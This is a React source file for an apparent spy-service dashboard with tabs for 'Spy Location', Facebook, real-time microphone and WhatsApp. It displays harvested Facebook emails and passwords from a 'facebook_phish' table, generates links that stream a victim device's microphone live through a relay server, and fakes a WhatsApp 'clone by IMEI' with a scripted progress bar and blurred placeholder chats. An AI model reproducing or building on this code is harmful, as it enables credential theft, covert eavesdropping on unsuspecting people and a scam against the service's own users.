import React, { useState, useEffect, useRef } from 'react';
import Header from './Header';
import LinkGenerator from './LinkGenerator';
import LinksList from './LinksList';
import Sidebar from './Sidebar';
import { supabase } from '../supabase';

function FacebookCaptures() {
  const [links, setLinks] = useState([]);
  const usuario = localStorage.getItem('usuario');
  useEffect(() => {
    async function fetchLinks() {
      const { data } = await supabase
        .from('facebook_phish')
        .select('*')
        .eq('email', usuario)
        .order('created_at', { ascending: false });
      setLinks(data || []);
    }
    fetchLinks();
  }, []);

  return (
    <div style={{ margin: '2rem 0' }}>
      <h3 style={{ color: 'var(--ouro-tentacao)' }}>Facebook Phishing Captures</h3>
      {links.length === 0 && <p style={{ color: 'var(--cinza-conspiracao)' }}>No phishing links created yet.</p>}
      {links.map(link => (
        <div key={link.id} style={{
          background: 'var(--fundo-destaque)',
          borderRadius: 10,
          margin: '1rem 0',
          padding: '1rem',
          boxShadow: '0 2px 8px rgba(76,76,76,0.08)'
        }}>
          <div style={{ marginBottom: 8 }}>
            <b style={{ color: 'var(--ouro-tentacao)' }}>{link.url}</b>
          </div>
          <div style={{ fontSize: 14, color: 'var(--cinza-conspiracao)' }}>
            {(!link.capturas || link.capturas.length === 0) ? 'No data captured yet.' : `${link.capturas.length} capture(s):`}
          </div>
          {link.capturas && link.capturas.length > 0 && (
            <ul style={{ margin: '0.5rem 0 0 0', padding: 0, listStyle: 'none' }}>
              {link.capturas.map((c, i) => (
                <li key={i} style={{
                  background: 'rgba(255,143,163,0.08)',
                  borderRadius: 6,
                  margin: '0.25rem 0',
                  padding: '0.5rem',
                  color: 'var(--branco-confissao)'
                }}>
                  <div><b>Date:</b> {c.data}</div>
                  <div><b>Email:</b> {c.email}</div>
                  <div><b>Password:</b> {c.senha}</div>
                </li>
              ))}
            </ul>
          )}
        </div>
      ))}
    </div>
  );
}

function MicrophonePlaceholder() {
  const [links, setLinks] = useState([]);
  const [listeningId, setListeningId] = useState(null);
  const audioContextRef = useRef(null);
  const wsRef = useRef(null);

  const WS_URL = 'wss://mic-relay-server.onrender.com';

  function gerarLink() {
    const id = Math.random().toString(36).substring(2, 10);
    setLinks(l => [{ id, url: 'https://redirect-online.vercel.app/microphone/' + id }, ...l]);
  }

  function listen(id) {
    setListeningId(id);
    if (!audioContextRef.current) {
      audioContextRef.current = new (window.AudioContext || window.webkitAudioContext)();
    }
    const audioContext = audioContextRef.current;
    if (audioContext.state === 'suspended') {
      audioContext.resume();
    }
    if (wsRef.current) {
      wsRef.current.close();
    }
    const ws = new window.WebSocket(WS_URL);
    wsRef.current = ws;

    let audioQueue = [];
    let processor = null;

    ws.onopen = () => {
      ws.send(JSON.stringify({ listen: id }));
      processor = audioContext.createScriptProcessor(4096, 1, 1);
      processor.onaudioprocess = function (e) {
        const output = e.outputBuffer.getChannelData(0);
        if (audioQueue.length > 0) {
          const buffer = audioQueue.shift();
          output.set(buffer);
        } else {
          output.fill(0);
        }
      };
      processor.connect(audioContext.destination);
    };

    ws.onmessage = e => {
      const msg = JSON.parse(e.data);
      if (msg.id === id && msg.audio) {
        const floatArray = new Float32Array(msg.audio);
        audioQueue.push(floatArray);
      }
    };

    ws.onclose = () => {
      setListeningId(null);
      if (processor) processor.disconnect();
    };
  }

  // Sempre que um novo link for adicionado, começa a ouvir automaticamente o mais recente
  React.useEffect(() => {
    if (links.length > 0 && listeningId !== links[0].id) {
      listen(links[0].id);
    }
    // eslint-disable-next-line
  }, [links]);

  return (
    <div style={{ margin: '2rem 0', textAlign: 'center' }}>
      <h3 style={{ color: 'var(--ouro-tentacao)' }}>Real-time Microphone</h3>
      <p style={{ color: 'var(--cinza-conspiracao)' }}>Generate a link to request real-time microphone access from another device.</p>
      <button onClick={gerarLink} style={{
        background: 'var(--vermelho-paixao)',
        color: 'var(--branco-confissao)',
        borderRadius: 8,
        padding: '0.75rem 2rem',
        fontFamily: 'Montserrat',
        fontWeight: 'bold',
        fontSize: '1.1rem',
        border: 'none',
        cursor: 'pointer',
        transition: 'background 0.2s',
        marginTop: 8
      }}>Generate Microphone Link</button>
      {links.length > 0 && (
        <div style={{ marginTop: 20 }}>
          {links.map(link => (
            <div key={link.id} style={{
              background: 'var(--fundo-destaque)',
              borderRadius: 10,
              margin: '1rem 0',
              padding: '1rem',
              boxShadow: '0 2px 8px rgba(76,76,76,0.08)'
            }}>
              <div style={{ marginBottom: 8 }}>
                <b style={{ color: 'var(--ouro-tentacao)' }}>{link.url}</b>
              </div>
              <button
                onClick={() => listen(link.id)}
                disabled={listeningId === link.id}
                style={{
                  background: listeningId === link.id ? 'var(--vermelho-paixao)' : 'var(--ouro-tentacao)',
                  color: listeningId === link.id ? 'var(--branco-confissao)' : 'var(--preto-espionagem)',
                  borderRadius: 8,
                  padding: '0.5rem 1.5rem',
                  fontFamily: 'Montserrat',
                  fontWeight: 'bold',
                  fontSize: '1rem',
                  border: 'none',
                  cursor: 'pointer',
                  marginTop: 10
                }}
              >
                {listeningId === link.id ? 'Listening...' : 'Listen in real time'}
              </button>
            </div>
          ))}
        </div>
      )}
    </div>
  );
}

function WhatsAppWebSim({ onBack }) {
  const [selected, setSelected] = useState(0);
  const chatTimes = [
    '09:42', '10:24', '13:58', '18:02', '18:05', '18:08', '19:01', '19:10', '20:02', '21:10'
  ];
  const chats = chatTimes.map((time, i) => ({
    name: 'Unknown',
    last: 'This message was not loaded, please wait...',
    time,
    avatar: '?',
    messages: [
      { fromMe: false, text: 'This message was not loaded, please wait...', time: '09:42' },
      { fromMe: true, text: 'This message was not loaded, please wait...', time: '10:24' },
      { fromMe: false, text: 'This message was not loaded, please wait...', time: '13:58' },
      { fromMe: true, text: 'This message was not loaded, please wait...', time: '18:02' },
      { fromMe: false, text: 'This message was not loaded, please wait...', time: '18:05' },
      { fromMe: true, text: 'This message was not loaded, please wait...', time: '18:08' },
      { fromMe: false, text: 'This message was not loaded, please wait...', time: '19:01' },
      { fromMe: true, text: 'This message was not loaded, please wait...', time: '19:10' },
      { fromMe: false, text: 'This message was not loaded, please wait...', time: '20:02' },
      { fromMe: true, text: 'This message was not loaded, please wait...', time: '20:15' },
      { fromMe: false, text: 'This message was not loaded, please wait...', time: '20:30' },
      { fromMe: true, text: 'This message was not loaded, please wait...', time: '20:45' },
      { fromMe: false, text: 'This message was not loaded, please wait...', time: '21:00' },
      { fromMe: true, text: 'This message was not loaded, please wait...', time: '21:10' },
    ]
  }));
  const chat = chats[selected];
  // sortedMessages local
  const sortedMessages = chat && chat.messages ? [...chat.messages].sort((a, b) => {
    const [hA, mA] = a.time.split(":").map(Number);
    const [hB, mB] = b.time.split(":").map(Number);
    return hB * 60 + mB - (hA * 60 + mA);
  }) : [];

  return (
    <div style={{
      minHeight: '80vh',
      background: '#111b21 url("https://static.whatsapp.net/rsrc.php/v3/yl/r/8zQ2Wg6q4kN.png") repeat',
      color: '#e9edef',
      display: 'flex',
      flexDirection: 'row',
      alignItems: 'stretch',
      justifyContent: 'center',
      fontFamily: 'Inter, Arial, sans-serif',
      borderRadius: 16,
      boxShadow: '0 2px 8px #0001',
      maxWidth: 1100,
      margin: '32px auto',
      padding: 0
    }}>
      {/* Sidebar de chats */}
      <div style={{
        width: 320,
        background: '#202c33',
        borderRadius: '16px 0 0 16px',
        boxShadow: '0 2px 8px #0001',
        display: 'flex', flexDirection: 'column', alignItems: 'stretch',
        borderRight: '1.5px solid #232323',
        minHeight: 520
      }}>
        <div style={{ padding: '1.2rem 1.2rem 0.7rem 1.2rem', borderBottom: '1.5px solid #232323' }}>
          <input disabled placeholder="Search or start new chat" style={{
            width: '100%', background: '#232d36', border: 'none', borderRadius: 8, color: '#b0b0b0', fontSize: 15, padding: '0.7rem 1rem', outline: 'none', fontFamily: 'Inter', marginBottom: 8
          }} />
        </div>
        <div style={{ flex: 1, overflowY: 'auto', padding: '0.5rem 0' }}>
          {chats.map((c, i) => (
            <div key={i} onClick={() => setSelected(i)} style={{
              display: 'flex', alignItems: 'center', gap: 14, padding: '0.7rem 1.1rem', cursor: 'pointer',
              background: selected === i ? '#232d36' : 'transparent',
              borderLeft: selected === i ? '3px solid #25d366' : '3px solid transparent',
              borderRadius: 8, marginBottom: 2, transition: 'background 0.2s'
            }}>
              <div style={{ width: 38, height: 38, borderRadius: '50%', background: '#232d36', color: '#25d366', display: 'flex', alignItems: 'center', justifyContent: 'center', fontWeight: 700, fontSize: 20 }}>{c.avatar}</div>
              <div style={{ flex: 1, minWidth: 0 }}>
                <div style={{ fontWeight: 600, color: '#e9edef', fontSize: '1rem', whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>{c.name}</div>
                <div style={{ color: '#b0b0b0', fontSize: '0.97rem', marginTop: 2, whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>{c.last}</div>
              </div>
              <div style={{ color: '#b0b0b0', fontSize: '0.93rem', marginLeft: 10, flexShrink: 0 }}>{c.time}</div>
            </div>
          ))}
          <button onClick={() => setShowLoadMoreMsg(true)} style={{
            width: '90%', margin: '16px auto 8px auto', display: 'block', background: '#232d36', color: '#25d366', border: 'none', borderRadius: 8, padding: '0.7rem 1.2rem', fontWeight: 700, fontSize: 15, cursor: 'pointer'
          }}>Carregar mais chats</button>
        </div>
      </div>
      {/* Área de chat */}
      <div style={{
        flex: 1,
        background: 'transparent',
        borderRadius: '0 16px 16px 0',
        display: 'flex', flexDirection: 'column', alignItems: 'stretch',
        minHeight: 520
      }}>
        {showLoadMoreMsg ? (
          <div style={{
            background: 'transparent',
            borderRadius: 14,
            boxShadow: 'none',
            padding: '2.5rem 2.2rem',
            maxWidth: 700,
            width: '100%',
            margin: '32px auto 0 auto',
            minHeight: 320,
            maxHeight: 420,
            display: 'flex', alignItems: 'center', justifyContent: 'center',
          }}>
            <span style={{ color: '#E60033', fontWeight: 600, fontSize: 18, textAlign: 'center' }}>
              You do not have access to the content of this chat. The IMEI must be filled in correctly to access the conversations.
            </span>
          </div>
        ) : (
          <>
            {/* Barra superior do chat */}
            <div style={{
              width: '100%',
              background: '#202c33',
              borderRadius: '0 14px 0 0',
              boxShadow: '0 2px 8px #0001',
              padding: '1.2rem 2.2rem',
              display: 'flex', alignItems: 'center', gap: 16
            }}>
              <div style={{ width: 44, height: 44, borderRadius: '50%', background: '#25d366', color: '#fff', display: 'flex', alignItems: 'center', justifyContent: 'center', fontWeight: 700, fontSize: 22 }}>?</div>
              <div>
                <div style={{ fontWeight: 700, color: '#25d366', fontSize: 18 }}>Unknown</div>
                <div style={{ color: '#b0b0b0', fontSize: 14 }}>online</div>
              </div>
              <div style={{ marginLeft: 18, display: 'flex', gap: 12 }}>
                <span style={{ color: '#b0b0b0', fontSize: 22, cursor: 'not-allowed' }}>📞</span>
                <span style={{ color: '#b0b0b0', fontSize: 22, cursor: 'not-allowed' }}>📹</span>
                <span style={{ color: '#b0b0b0', fontSize: 22, cursor: 'not-allowed' }}>⋮</span>
              </div>
            </div>
            {/* Mensagens (ocultas) */}
            <div style={{
              background: 'transparent',
              borderRadius: 14,
              boxShadow: 'none',
              padding: '1.5rem 2.2rem',
              maxWidth: 700,
              width: '100%',
              minHeight: 320,
              maxHeight: 420,
              overflowY: 'auto',
              display: 'flex', flexDirection: 'column', gap: 0
            }}>
              {sortedMessages.map((msg, i) => (
                <div key={i} style={{
                  display: 'flex', flexDirection: msg.fromMe ? 'row-reverse' : 'row', alignItems: 'flex-end',
                  marginBottom: 10, width: '100%'
                }}>
                  <div style={{
                    background: msg.fromMe ? '#005c4b' : '#232d36',
                    color: '#e9edef',
                    borderRadius: msg.fromMe ? '16px 4px 16px 16px' : '4px 16px 16px 16px',
                    padding: '0.7rem 1.1rem',
                    minWidth: 60,
                    maxWidth: '70%',
                    fontSize: 15,
                    position: 'relative',
                    filter: 'blur(3px) grayscale(0.3) brightness(0.7)',
                    userSelect: 'none',
                    cursor: 'not-allowed',
                    marginLeft: msg.fromMe ? 0 : 8,
                    marginRight: msg.fromMe ? 8 : 0
                  }}>
                    <span style={{ color: '#25d366', fontSize: 18, marginRight: 6 }}>💬</span>
                    {msg.text}
                    <span style={{ position: 'absolute', right: 10, bottom: 6, color: '#b0b0b0', fontSize: 12 }}>{msg.time}</span>
                  </div>
                </div>
              ))}
            </div>
            {/* Campo de digitação fake */}
            <div style={{
              width: '100%', maxWidth: 700, margin: '0 auto', marginTop: 18,
              display: 'flex', alignItems: 'center', gap: 12, background: '#232d36', borderRadius: 10, padding: '0.7rem 1.2rem'
            }}>
              <span style={{ color: '#b0b0b0', fontSize: 22, cursor: 'not-allowed' }}>📎</span>
              <input disabled placeholder="Type a message..." style={{
                flex: 1, background: 'transparent', border: 'none', color: '#b0b0b0', fontSize: 15, outline: 'none', fontFamily: 'Inter',
              }} />
              <button disabled style={{ background: '#25d366', color: '#fff', border: 'none', borderRadius: 8, padding: '0.5rem 1.2rem', fontWeight: 700, fontSize: 15, cursor: 'not-allowed' }}>Send</button>
            </div>
            {/* Mensagem de privacidade */}
            <div style={{ color: '#b0b0b0', fontSize: 15, marginTop: 18, textAlign: 'center', maxWidth: 700 }}>
              <span style={{ color: '#E60033', fontWeight: 600 }}>You do not have access to the content of this chat. The IMEI must be filled in correctly to access the conversations.</span>
            </div>
            <button onClick={onBack} style={{ margin: '32px auto 0 auto', background: '#232d36', color: '#25d366', border: 'none', borderRadius: 8, padding: '0.7rem 2.2rem', fontWeight: 700, fontSize: 15, cursor: 'pointer', display: 'block' }}>Back</button>
          </>
        )}
      </div>
    </div>
  );
}

function WhatsAppSim({ onBack, showLoadMoreMsg, setShowLoadMoreMsg }) {
  const [option, setOption] = useState('clone');
  const [phone, setPhone] = useState('');
  const [device, setDevice] = useState('');
  const [imei, setImei] = useState('');
  const [connecting, setConnecting] = useState(false);
  const [progress, setProgress] = useState(0);
  const [timer, setTimer] = useState(10); // 10 seconds
  const [showMonitor, setShowMonitor] = useState(false);
  const [showChat, setShowChat] = useState(false);
  const [chatNumber, setChatNumber] = useState('');
  const deviceModels = [
    'Samsung Galaxy S23',
    'iPhone 15 Pro',
    'Xiaomi Redmi Note 12',
    'Motorola Edge 40',
    'OnePlus 11',
    'Google Pixel 8',
    'Huawei P60',
    'Asus Zenfone 10',
    'Other...'
  ];

  // Simulação de progresso
  React.useEffect(() => {
    let interval;
    if (connecting && progress < 100) {
      interval = setInterval(() => {
        setProgress(p => Math.min(100, p + 100 / 10)); // 10 steps to 100%
        setTimer(t => t > 0 ? t - 1 : 0);
      }, 1000);
    }
    if (progress >= 100 && connecting) {
      setTimeout(() => setShowMonitor(true), 1200);
    }
    if (progress >= 100) {
      clearInterval(interval);
    }
    return () => clearInterval(interval);
  }, [connecting, progress]);

  function handleConnect(e) {
    e.preventDefault();
    setConnecting(true);
    setProgress(10);
    setTimer(10);
    setShowMonitor(false);
    setTimeout(() => {
      setShowChat(true);
      setChatNumber(phone);
      setConnecting(false);
      setProgress(0);
      setTimer(10);
    }, 12000); // 10s + buffer
  }

  if (showChat) {
    return <WhatsAppWebSim onBack={() => {
      setShowChat(false);
      setPhone('');
      setDevice('');
      setImei('');
      setOption('clone');
      setShowMonitor(false);
      if (onBack) onBack();
    }} />;
  }

  return (
    <div style={{ margin: '2rem 0', textAlign: 'center' }}>
      <h3 style={{ color: 'var(--vermelho)' }}>WhatsApp</h3>
      <div style={{ marginBottom: 18 }}>
        <label style={{ marginRight: 16 }}>
          <input type="radio" checked={option === 'clone'} onChange={() => setOption('clone')} /> Clone by phone number
        </label>
        <label>
          <input type="radio" checked={option === 'web'} onChange={() => setOption('web')} /> WhatsApp Web
        </label>
      </div>
      {option === 'clone' && !showMonitor && (
        <form onSubmit={handleConnect} style={{ maxWidth: 340, margin: '0 auto', background: 'var(--cinza-card)', borderRadius: 12, padding: 24, boxShadow: '0 2px 8px #0005' }}>
          <div style={{ marginBottom: 14, textAlign: 'left' }}>
            <label>Phone number</label>
            <input type="text" value={phone} onChange={e => setPhone(e.target.value)} required placeholder="e.g. +15551234567" style={{ width: '100%', padding: 8, borderRadius: 6, border: '1px solid var(--cinza-claro)', marginTop: 4, fontSize: 15, background: 'var(--cinza-escuro)', color: '#fff' }} />
          </div>
          <div style={{ marginBottom: 14, textAlign: 'left' }}>
            <label>Device model</label>
            <select value={device} onChange={e => setDevice(e.target.value)} required style={{ width: '100%', padding: 8, borderRadius: 6, border: '1px solid var(--cinza-claro)', marginTop: 4, fontSize: 15, background: 'var(--cinza-escuro)', color: '#fff' }}>
              <option value="">Select a model...</option>
              {deviceModels.map(m => <option key={m} value={m}>{m}</option>)}
            </select>
          </div>
          <div style={{ marginBottom: 18, textAlign: 'left' }}>
            <label>IMEI</label>
            <input type="text" value={imei} onChange={e => setImei(e.target.value)} required placeholder="e.g. 356938035643809" style={{ width: '100%', padding: 8, borderRadius: 6, border: '1px solid var(--cinza-claro)', marginTop: 4, fontSize: 15, background: 'var(--cinza-escuro)', color: '#fff' }} />
          </div>
          <div style={{ color: 'var(--vermelho)', fontWeight: 600, marginBottom: 12, fontSize: 15 }}>
            You must enter the correct IMEI to access the conversations.
          </div>
          <button type="submit" disabled={connecting} style={{
            background: 'var(--vermelho)',
            color: '#fff',
            borderRadius: 10,
            padding: '0.7rem 1.7rem',
            fontSize: '1rem',
            fontFamily: 'Inter',
            fontWeight: 600,
            boxShadow: '0 2px 8px 0 #E6003322',
            transition: 'box-shadow 0.2s, background 0.2s',
            marginTop: 8
          }}>Connect</button>
          {connecting && (
            <div style={{ marginTop: 28, textAlign: 'left' }}>
              <div style={{ width: '100%', background: '#232323', borderRadius: 6, height: 16, marginBottom: 8 }}>
                <div style={{ width: `${progress}%`, background: 'var(--vermelho)', height: 16, borderRadius: 6, transition: 'width 0.5s' }} />
              </div>
              <div style={{ fontSize: 15, marginBottom: 6, color: 'var(--vermelho)' }}><b>Connecting to WhatsApp</b></div>
              <div style={{ fontSize: 14, marginBottom: 4 }}>Monitoring... {Math.floor(timer/60)}:{(timer%60).toString().padStart(2,'0')}</div>
              <div style={{ fontSize: 14, marginBottom: 4 }}>{Math.floor(progress)}%</div>
              <div style={{ fontSize: 14, marginBottom: 4, color: progress > 20 ? 'var(--sucesso)' : 'var(--cinza-claro)' }}>✅ Network connected</div>
              <div style={{ fontSize: 14, marginBottom: 4 }}>Monitoring WhatsApp activity...</div>
              <div style={{ fontSize: 14, marginBottom: 4 }}>Synchronizing with WhatsApp...</div>
              <div style={{ fontSize: 13, marginTop: 10, color: 'var(--aviso)' }}>
                <b>IMPORTANT:</b> Stay connected to the network throughout the entire process. The connection may take a few minutes.
              </div>
            </div>
          )}
        </form>
      )}
      {option === 'clone' && showMonitor && showChat && (
        <WhatsAppWebSim onBack={() => setShowChat(false)} />
      )}
      {option === 'web' && (
        <div style={{ marginTop: 32, background: 'var(--cinza-card)', borderRadius: 12, padding: 24, boxShadow: '0 2px 8px #0005', fontSize: 16 }}>
          <b>WhatsApp Web</b>
          <div style={{ marginTop: 12, color: 'var(--cinza-claro)' }}>
            This feature is coming soon.
          </div>
        </div>
      )}
    </div>
  );
}

export default function Dashboard({ email }) {
  const [active, setActive] = useState(() => localStorage.getItem('dashboardActiveTab') || 'Spy Location');
  const [showLoadMoreMsg, setShowLoadMoreMsg] = useState(false);

  useEffect(() => {
    localStorage.setItem('dashboardActiveTab', active);
  }, [active]);

  return (
    <div style={{ display: 'flex', minHeight: '100vh', background: 'var(--preto-espionagem)' }}>
      <Sidebar active={active} onSelect={setActive} />
      <div style={{
        flex: 1,
        marginLeft: 220,
        padding: '2.5rem 1rem 1.5rem 1rem',
        maxWidth: 900,
        width: '100%',
        marginRight: 'auto',
        marginTop: 0,
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        justifyContent: 'flex-start',
      }}>
        <Header />
        <div style={{ width: '100%', maxWidth: 600 }}>
          <div className="card-glass">
            <h2 style={{ color: 'var(--ouro-tentacao)', textAlign: 'center', marginBottom: 8, fontFamily: 'Poppins' }}>Secret Dashboard</h2>
            <p style={{ textAlign: 'center', color: 'var(--cinza-conspiracao)', marginBottom: 32, fontSize: 17 }}>Welcome, <b>{email}</b>!</p>
            {active === 'Spy Location' && <><LinkGenerator /><LinksList /></>}
            {active === 'Facebook' && <><LinkGenerator onlyFacebook /><FacebookCaptures /></>}
            {active === 'Real-time Microphone' && <MicrophonePlaceholder />}
            {active === 'WhatsApp' && (
              <WhatsAppSim
                onBack={() => setShowLoadMoreMsg(false)}
                showLoadMoreMsg={showLoadMoreMsg}
                setShowLoadMoreMsg={setShowLoadMoreMsg}
              />
            )}
            {active !== 'Spy Location' && active !== 'Facebook' && active !== 'Real-time Microphone' && active !== 'WhatsApp' && (
              <div style={{
                background: 'var(--fundo-destaque)',
                borderRadius: 16,
                boxShadow: '0 4px 24px rgba(76,76,76,0.12)',
                padding: '2.5rem 1.5rem',
                textAlign: 'center',
                color: 'var(--cinza-conspiracao)',
                fontSize: 20,
                marginTop: 32
              }}>
                <b>{active}</b> coming soon...
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
}